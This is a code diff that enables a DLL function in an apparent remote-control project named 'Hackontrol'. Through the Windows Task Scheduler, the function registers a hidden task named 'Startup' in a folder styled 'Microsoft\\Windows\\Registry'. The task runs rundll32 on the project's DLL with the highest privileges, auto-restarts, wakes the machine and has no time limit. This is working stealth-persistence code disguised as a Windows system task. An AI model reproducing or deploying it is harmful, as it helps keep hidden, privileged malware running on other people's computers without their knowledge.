@@ -1,23 +1,23 @@
+#include <libkhopan.h>
+#include <libhackontrol.h>
 #include <taskschd.h>
-
-#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
 
 #define FUNCTION_LIBDLL32 L"Execute"
 #define TASK_FILE         L"Startup"
 #define TASK_FOLDER       L"Microsoft\\Windows\\Registry"
 
 __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LPSTR argument, int command) {
-	/*HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"CoInitializeEx");
+		KHOPANERRORMESSAGE_WIN32(result, L"CoInitializeEx");
 		return;
 	}
 
 	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"CoInitializeSecurity");
+		KHOPANERRORMESSAGE_WIN32(result, L"CoInitializeSecurity");
 		goto uninitialize;
 	}
 
@@ -25,7 +25,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, &taskService);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"CoCreateInstance");
+		KHOPANERRORMESSAGE_WIN32(result, L"CoCreateInstance");
 		goto uninitialize;
 	}
 
@@ -33,7 +33,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = taskService->lpVtbl->Connect(taskService, emptyVariant, emptyVariant, emptyVariant, emptyVariant);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskService::Connect");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskService::Connect");
 		taskService->lpVtbl->Release(taskService);
 		goto uninitialize;
 	}
@@ -42,7 +42,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = taskService->lpVtbl->GetFolder(taskService, L"\\", &rootFolder);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskService::GetFolder");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskService::GetFolder");
 		taskService->lpVtbl->Release(taskService);
 		goto uninitialize;
 	}
@@ -55,7 +55,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 		rootFolder->lpVtbl->Release(rootFolder);
 
 		if(FAILED(result)) {
-			KHWin32DialogErrorW(result, L"ITaskFolder::GetFolder");
+			KHOPANERRORMESSAGE_WIN32(result, L"ITaskFolder::GetFolder");
 			taskService->lpVtbl->Release(taskService);
 			goto uninitialize;
 		}
@@ -63,7 +63,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 		rootFolder->lpVtbl->Release(rootFolder);
 
 		if(FAILED(result)) {
-			KHWin32DialogErrorW(result, L"ITaskFolder::CreateFolder");
+			KHOPANERRORMESSAGE_WIN32(result, L"ITaskFolder::CreateFolder");
 			taskService->lpVtbl->Release(taskService);
 			goto uninitialize;
 		}
@@ -74,7 +74,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	taskService->lpVtbl->Release(taskService);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskService::NewTask");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskService::NewTask");
 		goto releaseTaskFolder;
 	}
 	
@@ -82,14 +82,14 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = taskDefinition->lpVtbl->get_Principal(taskDefinition, &principal);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Principal");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Principal");
 		goto releaseTaskDefinition;
 	}
 
 	result = principal->lpVtbl->put_RunLevel(principal, TASK_RUNLEVEL_HIGHEST);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IPrincipal::put_RunLevel");
+		KHOPANERRORMESSAGE_WIN32(result, L"IPrincipal::put_RunLevel");
 		principal->lpVtbl->Release(principal);
 		goto releaseTaskDefinition;
 	}
@@ -98,7 +98,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	principal->lpVtbl->Release(principal);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IPrincipal::put_UserId");
+		KHOPANERRORMESSAGE_WIN32(result, L"IPrincipal::put_UserId");
 		goto releaseTaskDefinition;
 	}
 
@@ -106,7 +106,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = taskDefinition->lpVtbl->get_Triggers(taskDefinition, &triggerCollection);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Triggers");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Triggers");
 		goto releaseTaskDefinition;
 	}
 
@@ -115,7 +115,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	triggerCollection->lpVtbl->Release(triggerCollection);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITriggerCollection::Create");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITriggerCollection::Create");
 		goto releaseTaskDefinition;
 	}
 
@@ -124,7 +124,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = taskDefinition->lpVtbl->get_Actions(taskDefinition, &actionCollection);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Actions");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Actions");
 		goto releaseTaskDefinition;
 	}
 
@@ -133,7 +133,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	actionCollection->lpVtbl->Release(actionCollection);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IActionCollection::Create");
+		KHOPANERRORMESSAGE_WIN32(result, L"IActionCollection::Create");
 		goto releaseTaskDefinition;
 	}
 
@@ -142,60 +142,60 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	action->lpVtbl->Release(action);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IAction::QueryInterface");
+		KHOPANERRORMESSAGE_WIN32(result, L"IAction::QueryInterface");
 		goto releaseTaskDefinition;
 	}
 
-	LPWSTR pathFileRundll32 = KHWin32GetRundll32FileW();
+	LPWSTR fileRundll32 = KHOPANFileGetRundll32();
 
-	if(!pathFileRundll32) {
-		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+	if(!fileRundll32) {
+		KHOPANLASTERRORMESSAGE_WIN32(L"KHOPANFileGetRundll32");
 		executeAction->lpVtbl->Release(executeAction);
 		goto releaseTaskDefinition;
 	}
 
-	result = executeAction->lpVtbl->put_Path(executeAction, pathFileRundll32);
-	FREE(pathFileRundll32);
+	result = executeAction->lpVtbl->put_Path(executeAction, fileRundll32);
+	LocalFree(fileRundll32);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IExecAction::put_Path");
+		KHOPANERRORMESSAGE_WIN32(result, L"IExecAction::put_Path");
 		executeAction->lpVtbl->Release(executeAction);
 		goto releaseTaskDefinition;
 	}
 
-	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);
+	LPWSTR folderHackontrol = HackontrolGetHomeDirectory();
 
-	if(!pathFolderHackontrol) {
-		KHWin32DialogErrorW(GetLastError(), L"HackontrolGetDirectory");
+	if(!folderHackontrol) {
+		KHOPANLASTERRORMESSAGE_WIN32(L"HackontrolGetHomeDirectory");
 		executeAction->lpVtbl->Release(executeAction);
 		goto releaseTaskDefinition;
 	}
 
-	LPWSTR argumentFileRundll32 = KHFormatMessageW(L"\"%ws\\" FILE_LIBDLL32 L"\" " FUNCTION_LIBDLL32, pathFolderHackontrol);
+	LPWSTR argumentRundll32 = KHOPANFormatMessage(L"\"%ws\\" FILE_LIBDLL32 L"\" " FUNCTION_LIBDLL32, folderHackontrol);
 
-	if(!argumentFileRundll32) {
-		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		FREE(pathFolderHackontrol);
+	if(!argumentRundll32) {
+		KHOPANERRORMESSAGE_WIN32(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		LocalFree(folderHackontrol);
 		executeAction->lpVtbl->Release(executeAction);
 		goto releaseTaskDefinition;
 	}
 
-	result = executeAction->lpVtbl->put_Arguments(executeAction, argumentFileRundll32);
-	FREE(argumentFileRundll32);
+	result = executeAction->lpVtbl->put_Arguments(executeAction, argumentRundll32);
+	LocalFree(argumentRundll32);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IExecAction::put_Arguments");
-		FREE(pathFolderHackontrol);
+		KHOPANERRORMESSAGE_WIN32(result, L"IExecAction::put_Arguments");
+		LocalFree(folderHackontrol);
 		executeAction->lpVtbl->Release(executeAction);
 		goto releaseTaskDefinition;
 	}
 
-	result = executeAction->lpVtbl->put_WorkingDirectory(executeAction, pathFolderHackontrol);
-	FREE(pathFolderHackontrol);
+	result = executeAction->lpVtbl->put_WorkingDirectory(executeAction, folderHackontrol);
+	LocalFree(folderHackontrol);
 	executeAction->lpVtbl->Release(executeAction);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IExecAction::put_WorkingDirectory");
+		KHOPANERRORMESSAGE_WIN32(result, L"IExecAction::put_WorkingDirectory");
 		goto releaseTaskDefinition;
 	}
 
@@ -203,77 +203,77 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = taskDefinition->lpVtbl->get_Settings(taskDefinition, &taskSettings);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Settings");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskDefinition::get_Settings");
 		goto releaseTaskDefinition;
 	}
 
 	result = taskSettings->lpVtbl->put_AllowDemandStart(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_AllowDemandStart");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_AllowDemandStart");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_StartWhenAvailable(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_StartWhenAvailable");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_StartWhenAvailable");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_RestartInterval(taskSettings, L"PT1M");
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_RestartInterval");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_RestartInterval");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_RestartCount(taskSettings, 5);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_RestartCount");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_RestartCount");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_ExecutionTimeLimit(taskSettings, L"PT0M");
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_ExecutionTimeLimit");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_ExecutionTimeLimit");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_DisallowStartIfOnBatteries(taskSettings, VARIANT_FALSE);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_DisallowStartIfOnBatteries");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_DisallowStartIfOnBatteries");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_StopIfGoingOnBatteries(taskSettings, VARIANT_FALSE);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_WakeToRun(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_WakeToRun");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_WakeToRun");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_RunOnlyIfNetworkAvailable(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_RunOnlyIfNetworkAvailable");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_RunOnlyIfNetworkAvailable");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_Hidden(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskSettings::put_Hidden");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskSettings::put_Hidden");
 		goto releaseTaskSettings;
 	}
 	
@@ -282,7 +282,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	result = taskFolder->lpVtbl->RegisterTaskDefinition(taskFolder, TASK_FILE, taskDefinition, TASK_CREATE_OR_UPDATE, emptyVariant, emptyVariant, TASK_LOGON_GROUP, emptyVariant, &registeredTask);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"ITaskFolder::RegisterTaskDefinition");
+		KHOPANERRORMESSAGE_WIN32(result, L"ITaskFolder::RegisterTaskDefinition");
 		goto releaseTaskSettings;
 	}
 
@@ -292,7 +292,7 @@ __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LP
 	registeredTask->lpVtbl->Release(registeredTask);
 
 	if(FAILED(result)) {
-		KHWin32DialogErrorW(result, L"IRegisteredTask::Run");
+		KHOPANERRORMESSAGE_WIN32(result, L"IRegisteredTask::Run");
 		goto releaseTaskSettings;
 	}
 
@@ -304,5 +304,5 @@ releaseTaskDefinition:
 releaseTaskFolder:
 	taskFolder->lpVtbl->Release(taskFolder);
 uninitialize:
-	CoUninitialize();*/
+	CoUninitialize();
 }
